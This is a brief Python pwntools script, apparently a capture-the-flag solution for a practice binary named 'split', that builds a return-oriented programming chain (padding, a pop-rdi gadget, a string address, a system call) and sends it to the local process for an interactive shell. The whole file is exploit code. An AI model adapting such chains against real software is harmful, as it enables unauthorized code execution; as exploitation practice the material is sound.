from pwn import *

elf = context.binary = ELF("./split")

padding = b'a'*0x28 #40 byte
rdi_ret = 0x4007c3
string = 0x601060
system = 0x40074b

pay = flat(
    padding,
    rdi_ret,
    string,
    system
)

p = process("./split")
p.sendline(pay)
p.interactive()
